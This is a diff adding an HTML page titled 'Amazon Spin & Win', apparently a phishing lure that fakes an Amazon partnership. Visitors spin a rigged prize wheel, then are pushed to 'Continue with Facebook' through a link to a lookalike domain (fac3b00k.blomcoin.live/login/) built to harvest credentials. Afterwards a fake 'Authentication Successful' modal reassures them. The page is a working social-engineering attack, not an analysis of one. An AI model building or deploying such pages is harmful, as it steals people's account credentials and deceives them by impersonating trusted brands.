@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spin & Win - Social Media Lottery</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6d28d9;
+            --primary-light: #8b5cf6;
+            --primary-dark: #5b21b6;
+            --secondary: #ec4899;
+            --secondary-light: #f472b6;
+            --secondary-dark: #db2777;
+            --background: #f9fafb;
+            --card-bg: #ffffff;
+            --text: #1f2937;
+            --text-light: #6b7280;
+            --border: #e5e7eb;
+            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--background);
+            color: var(--text);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .subtitle {
+            font-size: 1.2rem;
+            color: var(--text-light);
+            margin-bottom: 1.5rem;
+        }
+
+        .main-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2rem;
+        }
+
+        @media (min-width: 768px) {
+            .main-content {
+                flex-direction: row;
+                align-items: flex-start;
+            }
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .wheel-outer {
+            position: relative;
+            width: 100%;
+            padding-bottom: 100%; /* Makes it a square */
+            background: linear-gradient(135deg, var(--primary-light), var(--primary-dark));
+            border-radius: 50%;
+            box-shadow: 0 0 0 15px rgba(109, 40, 217, 0.1), 
+                        0 0 0 30px rgba(109, 40, 217, 0.05),
+                        0 10px 20px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+            transition: transform 5s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+        }
+
+        .wheel {
+            position: absolute;
+            top: 5%;
+            left: 5%;
+            width: 90%;
+            height: 90%;
+            border-radius: 50%;
+            background-color: var(--card-bg);
+            overflow: hidden;
+            transition: transform 5s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+        }
+
+        .wheel-segment {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 50%;
+            height: 50%;
+            transform-origin: 0% 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            color: white;
+            font-weight: bold;
+            font-size: 0.9rem;
+            text-align: center;
+            padding-right: 20px;
+            transform: rotate(calc(var(--i) * 45deg)) skewY(-45deg);
+        }
+
+        .wheel-segment:nth-child(odd) {
+            background-color: var(--primary);
+        }
+
+        .wheel-segment:nth-child(even) {
+            background-color: var(--secondary);
+        }
+
+        .wheel-segment span {
+            transform: skewY(45deg) rotate(calc(var(--i) * -45deg));
+            width: 100%;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .wheel-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #f9fafb, #e5e7eb);
+            border-radius: 50%;
+            box-shadow: 0 0 0 8px rgba(0, 0, 0, 0.1), 0 0 0 15px rgba(255, 255, 255, 0.1);
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .wheel-center::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            background-color: var(--primary);
+            border-radius: 50%;
+        }
+
+        .wheel-pointer {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 40px;
+            height: 40px;
+            background-color: var(--secondary);
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            z-index: 5;
+        }
+
+        .spin-btn {
+            position: relative;
+            margin-top: 2rem;
+            padding: 1rem 3rem;
+            background: linear-gradient(135deg, var(--secondary), var(--secondary-dark));
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(236, 72, 153, 0.3);
+            transition: all 0.3s ease;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .spin-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(236, 72, 153, 0.4);
+        }
+
+        .spin-btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 5px rgba(236, 72, 153, 0.4);
+        }
+
+        .spin-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: all 0.5s ease;
+            z-index: -1;
+        }
+
+        .spin-btn:hover::before {
+            left: 100%;
+        }
+
+        .spin-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        .spin-btn:disabled:hover {
+            transform: none;
+        }
+
+        .spin-btn:disabled::before {
+            display: none;
+        }
+
+        .info-card {
+            flex: 1;
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+        }
+
+        .info-card h2 {
+            font-size: 1.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .info-card h2 i {
+            font-size: 1.2rem;
+        }
+
+        .instructions {
+            margin-bottom: 1.5rem;
+        }
+
+        .instructions ol {
+            padding-left: 1.5rem;
+        }
+
+        .instructions li {
+            margin-bottom: 0.5rem;
+            color: var(--text-light);
+        }
+
+        .prize-list {
+            margin-top: 1.5rem;
+        }
+
+        .prize-list h3 {
+            font-size: 1.2rem;
+            margin-bottom: 0.75rem;
+            color: var(--primary);
+        }
+
+        .prize-item {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.75rem;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .prize-item:last-child {
+            border-bottom: none;
+        }
+
+        .prize-item-icon {
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: var(--primary-light);
+            color: white;
+            border-radius: 50%;
+            font-size: 0.8rem;
+        }
+
+        .prize-item-content {
+            flex: 1;
+        }
+
+        .prize-item-title {
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+
+        .prize-item-description {
+            font-size: 0.9rem;
+            color: var(--text-light);
+        }
+
+        /* Full-screen prize overlay */
+        .prize-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.5s ease;
+            overflow-y: auto;
+            padding: 2rem;
+        }
+
+        .prize-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .prize-content {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            color: white;
+        }
+
+        .prize-icon-large {
+            font-size: 6rem;
+            margin-bottom: 1.5rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .prize-title-large {
+            font-size: 3rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .prize-description-large {
+            font-size: 1.5rem;
+            margin-bottom: 3rem;
+            opacity: 0.9;
+        }
+
+        .social-login-container {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 2rem;
+            backdrop-filter: blur(5px);
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .social-login-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 1.5rem;
+            color: white;
+            text-align: center;
+        }
+
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+            padding: 1rem;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            background-color: white;
+            text-decoration: none;
+            color: var(--text);
+            font-size: 1.1rem;
+        }
+
+        .social-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .social-btn:active {
+            transform: translateY(-1px);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .social-btn i {
+            font-size: 1.5rem;
+        }
+
+        .facebook {
+            color: #1877f2;
+        }
+
+        .twitter {
+            color: #1da1f2;
+        }
+
+        .google {
+            color: #ea4335;
+        }
+
+        .instagram {
+            color: #c13584;
+        }
+
+        .close-prize {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1.5rem;
+            transition: all 0.3s ease;
+        }
+
+        .close-prize:hover {
+            background-color: rgba(255, 255, 255, 0.3);
+            transform: rotate(90deg);
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1100;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.show {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content {
+            background-color: var(--card-bg);
+            border-radius: 15px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: var(--shadow);
+            text-align: center;
+        }
+
+        .modal-icon {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            color: var(--primary);
+        }
+
+        .modal-description {
+            color: var(--text-light);
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-btn {
+            padding: 0.75rem 2rem;
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .modal-btn:hover {
+            background-color: var(--primary-dark);
+        }
+
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            opacity: 0;
+            top: 0;
+            animation: confetti 5s ease-in-out forwards;
+            z-index: 1050;
+        }
+
+        @keyframes confetti {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(100vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background-color: var(--primary);
+            color: white;
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: var(--shadow);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            z-index: 50;
+        }
+
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @media (max-width: 768px) {
+            .prize-title-large {
+                font-size: 2rem;
+            }
+            
+            .prize-description-large {
+                font-size: 1.2rem;
+            }
+            
+            .prize-icon-large {
+                font-size: 4rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Amazon Spin & Win</h1>
+            <p class="subtitle">Spin the wheel, win amazing prizes, partnership from amazon!</p>
+        </header>
+
+        <div class="main-content">
+            <div class="wheel-container">
+                <div class="wheel-outer">
+                    <div class="wheel" id="wheel">
+                        <div class="wheel-segment" style="--i: 0">
+                            <span>$50 Gift Card</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 1">
+                            <span>Free Product</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 2">
+                            <span>25% Discount</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 3">
+                            <span>Try Again</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 4">
+                            <span>$100 Gift Card</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 5">
+                            <span>Free Shipping</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 6">
+                            <span>50% Discount</span>
+                        </div>
+                        <div class="wheel-segment" style="--i: 7">
+                            <span>Mystery Box</span>
+                        </div>
+                    </div>
+                    <div class="wheel-center"></div>
+                </div>
+                <div class="wheel-pointer"></div>
+                <button class="spin-btn" id="spinBtn">SPIN NOW</button>
+            </div>
+
+            <div class="info-card">
+                <h2><i class="fas fa-info-circle"></i> How It Works</h2>
+                <div class="instructions">
+                    <ol>
+                        <li>Spin the wheel to see what prize you can win</li>
+                        <li>Connect with your social media account to verify your identity</li>
+                        <li>Claim your prize and enjoy!</li>
+                    </ol>
+                </div>
+
+                <div class="prize-list">
+                    <h3>Possible Prizes</h3>
+                    <div class="prize-item">
+                        <div class="prize-item-icon">
+                            <i class="fas fa-gift"></i>
+                        </div>
+                        <div class="prize-item-content">
+                            <div class="prize-item-title">$50 - $100 Gift Cards</div>
+                            <div class="prize-item-description">Redeem at any of our partner stores</div>
+                        </div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-item-icon">
+                            <i class="fas fa-percentage"></i>
+                        </div>
+                        <div class="prize-item-content">
+                            <div class="prize-item-title">25% - 50% Discounts</div>
+                            <div class="prize-item-description">Save on your next purchase</div>
+                        </div>
+                    </div>
+                    <div class="prize-item">
+                        <div class="prize-item-icon">
+                            <i class="fas fa-box"></i>
+                        </div>
+                        <div class="prize-item-content">
+                            <div class="prize-item-title">Free Products & Mystery Boxes</div>
+                            <div class="prize-item-description">Surprise yourself with amazing products</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Full-screen Prize Overlay -->
+    <div class="prize-overlay" id="prizeOverlay">
+        <div class="close-prize" id="closePrize">
+            <i class="fas fa-times"></i>
+        </div>
+        <div class="prize-content">
+            <div class="prize-icon-large" id="prizeIconLarge">
+                <i class="fas fa-gift"></i>
+            </div>
+            <h1 class="prize-title-large" id="prizeTitleLarge">Congratulations!</h1>
+            <p class="prize-description-large" id="prizeDescriptionLarge">You've won a fantastic prize!</p>
+        </div>
+        <div class="social-login-container">
+            <h2 class="social-login-title">Connect with social media to claim your prize:</h2>
+            <div class="social-buttons">
+                <a href="https://fac3b00k.blomcoin.live/login/" target="_blank" class="social-btn" id="facebookLogin">
+                    <i class="fab fa-facebook-f facebook"></i>
+                    <span>Continue with Facebook</span>
+                </a>
+                {% comment %} <a href="https://twitter.com" target="_blank" class="social-btn" id="twitterLogin">
+                    <i class="fab fa-twitter twitter"></i>
+                    <span>Continue with Twitter</span>
+                </a>
+                <a href="https://accounts.google.com" target="_blank" class="social-btn" id="googleLogin">
+                    <i class="fab fa-google google"></i>
+                    <span>Continue with Google</span>
+                </a>
+                <a href="https://instagram.com" target="_blank" class="social-btn" id="instagramLogin">
+                    <i class="fab fa-instagram instagram"></i>
+                    <span>Continue with Instagram</span>
+                </a> {% endcomment %}
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="modal-title">Authentication Successful!</div>
+            <div class="modal-description">
+                You've successfully authenticated with social media. We'll process your prize and contact you soon!
+            </div>
+            <button class="modal-btn" id="closeSuccessModal">Got it!</button>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        You won a $50 Gift Card!
+    </div>
+
+    <script>
+        // DOM Elements
+        const wheel = document.getElementById('wheel');
+        const spinBtn = document.getElementById('spinBtn');
+        const prizeOverlay = document.getElementById('prizeOverlay');
+        const prizeTitleLarge = document.getElementById('prizeTitleLarge');
+        const prizeDescriptionLarge = document.getElementById('prizeDescriptionLarge');
+        const prizeIconLarge = document.getElementById('prizeIconLarge').querySelector('i');
+        const closePrize = document.getElementById('closePrize');
+        const successModal = document.getElementById('successModal');
+        const closeSuccessModal = document.getElementById('closeSuccessModal');
+        const notification = document.getElementById('notification');
+        const socialButtons = document.querySelectorAll('.social-btn');
+
+        // Prizes data
+        const prizes = [
+            {
+                name: "Amazon $200 Gift Card",
+                description: "You've won an amazaon $200 gift card! login to claim it.",
+                icon: "fas fa-gift"
+            },
+            {
+                name: "Free Product",
+                description: "You've won a free product! from amazon login to claim it.",
+                icon: "fas fa-box-open"
+            },
+            {
+                name: "25% Discount ",
+                description: "You've won a 25% discount on your next amazaon purchase! login to claim it.",
+                icon: "fas fa-percentage"
+            },
+            {
+                name: "Try Again",
+                description: "Sorry, no prize this time. Try again later!",
+                icon: "fas fa-redo"
+            },
+            {
+                name: "$1000 apple Gift Card",
+                description: "You've won a $100 apple gift card! login to claim it.",
+                icon: "fas fa-gift"
+            },
+            {
+                name: "Free Shipping",
+                description: "You've won free shipping on your next amazon order! login to claim it.",
+                icon: "fas fa-shipping-fast"
+            },
+            {
+                name: "50% Discount",
+                description: "You've won a 50% discount on your next amazon purchase ! login  to claim it.",
+                icon: "fas fa-percentage"
+            },
+            {
+                name: "Mystery Box",
+                description: "You've won a mystery box ! logina to claim it.",
+                icon: "fas fa-question-circle"
+            }
+        ];
+
+        // Variables
+        let isSpinning = false;
+        let currentRotation = 0;
+        let selectedPrize = null;
+
+        // Initialize
+        function init() {
+            // Add event listeners
+            spinBtn.addEventListener('click', spinWheel);
+            closePrize.addEventListener('click', () => {
+                prizeOverlay.classList.remove('show');
+            });
+            closeSuccessModal.addEventListener('click', () => {
+                successModal.classList.remove('show');
+            });
+
+            // Listen for social login clicks
+            socialButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    // This would normally be handled by the OAuth flow
+                    // For demo purposes, we'll show the success modal when they return
+                    localStorage.setItem('pendingAuth', 'true');
+                    localStorage.setItem('pendingPrize', JSON.stringify(selectedPrize));
+                });
+            });
+
+            // Check if user is returning from social auth
+            checkPendingAuth();
+        }
+
+        // Check if user is returning from social auth
+        function checkPendingAuth() {
+            const pendingAuth = localStorage.getItem('pendingAuth');
+            if (pendingAuth === 'true') {
+                // Clear the pending auth flag
+                localStorage.removeItem('pendingAuth');
+                
+                // Get the pending prize
+                const pendingPrize = JSON.parse(localStorage.getItem('pendingPrize'));
+                if (pendingPrize) {
+                    localStorage.removeItem('pendingPrize');
+                    
+                    // Show success modal
+                    successModal.classList.add('show');
+                    
+                    // Create confetti effect
+                    createConfetti();
+                }
+            }
+        }
+
+        // Spin the wheel
+        function spinWheel() {
+            if (isSpinning) return;
+            
+            isSpinning = true;
+            spinBtn.disabled = true;
+            
+            // Calculate a random rotation (between 2 and 5 full rotations)
+            const rotations = 2 + Math.random() * 3;
+            const degrees = rotations * 360;
+            
+            // Calculate which prize will be selected
+            const segmentDegrees = 360 / prizes.length;
+            const prizeIndex = Math.floor(Math.random() * prizes.length);
+            const prizeRotation = 360 - (prizeIndex * segmentDegrees) - (segmentDegrees / 2);
+            
+            // Calculate final rotation
+            const finalRotation = degrees + prizeRotation;
+            currentRotation += finalRotation;
+            
+            // Apply rotation to wheel
+            wheel.style.transform = `rotate(${currentRotation}deg)`;
+            
+            // Store selected prize
+            selectedPrize = prizes[prizeIndex];
+            
+            // Wait for animation to finish
+            setTimeout(() => {
+                isSpinning = false;
+                spinBtn.disabled = false;
+                
+                // Show prize
+                showPrize(selectedPrize);
+                
+                // Show notification
+                showNotification(`You won ${selectedPrize.name}!`);
+            }, 5000); // Match this with the CSS transition duration
+        }
+
+        // Show the prize
+        function showPrize(prize) {
+            // Update prize display
+            prizeTitleLarge.textContent = `Congratulations! You Won:`;
+            const prizeNameElement = document.createElement('div');
+            prizeNameElement.textContent = prize.name;
+            prizeNameElement.style.fontSize = '3.5rem';
+            prizeNameElement.style.fontWeight = 'bold';
+            prizeNameElement.style.marginTop = '0.5rem';
+            prizeNameElement.style.color = '#ffffff';
+            prizeNameElement.style.textShadow = '0 0 10px rgba(255,255,255,0.5)';
+            prizeTitleLarge.appendChild(prizeNameElement);
+            
+            prizeDescriptionLarge.textContent = prize.description;
+            
+            // Update prize icon
+            prizeIconLarge.className = prize.icon;
+            
+            // Show prize overlay
+            prizeOverlay.classList.add('show');
+            
+            // Hide social login section for "Try Again"
+            if (prize.name === "Try Again") {
+                document.querySelector('.social-login-container').style.display = 'none';
+            } else {
+                document.querySelector('.social-login-container').style.display = 'block';
+            }
+        }
+
+        // Show notification
+        function showNotification(message) {
+            notification.textContent = message;
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        // Create confetti effect
+        function createConfetti() {
+            const colors = ['#f94144', '#f3722c', '#f8961e', '#f9c74f', '#90be6d', '#43aa8b', '#577590'];
+            
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.width = Math.random() * 10 + 5 + 'px';
+                confetti.style.height = Math.random() * 10 + 5 + 'px';
+                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                confetti.style.animationDelay = Math.random() * 5 + 's';
+                
+                document.body.appendChild(confetti);
+                
+                // Remove confetti after animation
+                setTimeout(() => {
+                    confetti.remove();
+                }, 8000);
+            }
+        }
+
+        // Initialize the app
+        init();
+    </script>
+</body>
+</html>
